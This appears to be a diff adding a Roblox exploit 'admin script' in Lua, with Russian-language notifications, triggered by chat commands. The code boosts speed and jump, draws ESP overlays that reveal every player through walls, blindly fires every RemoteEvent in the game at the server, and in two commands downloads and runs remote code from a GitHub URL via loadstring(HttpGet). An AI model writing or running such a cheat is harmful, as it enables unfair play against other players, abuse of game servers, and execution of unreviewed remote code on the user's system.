@@ -1,0 +1,128 @@
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:FindFirstChildWhichIsA("Humanoid")
+
+function ChatMsg(message, dur)
+	if dur == nil then
+		dur = 3
+	end
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Admin Script",
+		Text = message,
+		Icon = "rbxassetid://12298448247",
+		Duration = dur,
+		Button1 = "OK",
+	})
+end
+
+
+
+ChatMsg("Скрипт на админ команды запущен")
+
+commands = {
+	["/e speed"] = function()
+		ChatMsg("Скорость увеличена на 50")
+		humanoid.WalkSpeed = humanoid.WalkSpeed + 50
+	end,
+	["/e highjump"] = function()
+		ChatMsg("Прыжок увеличен на to 50")
+		humanoid.UseJumpPower = true
+		humanoid.JumpPower = humanoid.JumpPower + 50
+	end,
+	["/e esp"] = function()
+		ChatMsg("ESP включен")
+		for i,plr in pairs(game.Players:GetPlayers()) do
+			local char = plr.Character or plr.CharacterAdded:Wait()
+			for i,det in pairs(char:GetDescendants()) do
+				if det:IsA("BasePart") then
+					
+					local gui = Instance.new("SurfaceGui", det)
+					gui.Face = Enum.NormalId.Back
+					gui.Adornee = det
+					gui.AlwaysOnTop = true
+					local frame = Instance.new("Frame", gui)
+					frame.Size = UDim2.new(1,0,1,0)
+					frame.Transparency = 0.5
+					
+					frame.BackgroundColor3 = plr.TeamColor.Color
+					
+					local gui = Instance.new("SurfaceGui", det)
+					gui.Face = Enum.NormalId.Top
+					gui.Adornee = det
+					gui.AlwaysOnTop = true
+					local frame = Instance.new("Frame", gui)
+					frame.Size = UDim2.new(1,0,1,0)
+					frame.Transparency = 0.5
+
+					frame.BackgroundColor3 = plr.TeamColor.Color
+					
+					local gui = Instance.new("SurfaceGui", det)
+					gui.Face = Enum.NormalId.Left
+					gui.Adornee = det
+					gui.AlwaysOnTop = true
+					local frame = Instance.new("Frame", gui)
+					frame.Size = UDim2.new(1,0,1,0)
+					frame.Transparency = 0.5
+
+					frame.BackgroundColor3 = plr.TeamColor.Color
+					
+					local gui = Instance.new("SurfaceGui", det)
+					gui.Face = Enum.NormalId.Front
+					gui.Adornee = det
+					gui.AlwaysOnTop = true
+					local frame = Instance.new("Frame", gui)
+					frame.Size = UDim2.new(1,0,1,0)
+					frame.Transparency = 0.5
+
+					frame.BackgroundColor3 = plr.TeamColor.Color
+					
+					local gui = Instance.new("SurfaceGui", det)
+					gui.Face = Enum.NormalId.Bottom
+					gui.Adornee = det
+					gui.AlwaysOnTop = true
+					local frame = Instance.new("Frame", gui)
+					frame.Size = UDim2.new(1,0,1,0)
+					frame.Transparency = 0.5
+
+					frame.BackgroundColor3 = plr.TeamColor.Color
+					
+					local gui = Instance.new("SurfaceGui", det)
+					gui.Face = Enum.NormalId.Right
+					gui.Adornee = det
+					gui.AlwaysOnTop = true
+					local frame = Instance.new("Frame", gui)
+					frame.Size = UDim2.new(1,0,1,0)
+					frame.Transparency = 0.5
+
+					frame.BackgroundColor3 = plr.TeamColor.Color
+					
+				end
+			end
+		end
+		
+	end,
+	
+	["/e easy"] = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/oFthiSUSer/Test2/main/easy.txt",true))()
+	end,
+	
+	["/e blackhole"] = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/oFthiSUSer/Test2/main/blackhole.txt",true))()
+	end,
+	
+	["/e remotes"] = function()
+		for i, v in pairs(game:GetDescendants()) do
+			if v:IsA("RemoteEvent") then
+				v:FireServer()
+				local message = "Вызван " .. v.Name
+				ChatMsg(message, 0.5)
+			end
+		end
+	end
+}
+player.Chatted:Connect(function(message)
+	local lowerMsg = string.lower(message)
+	if commands[lowerMsg] then
+		commands[lowerMsg]()
+	end
+end)
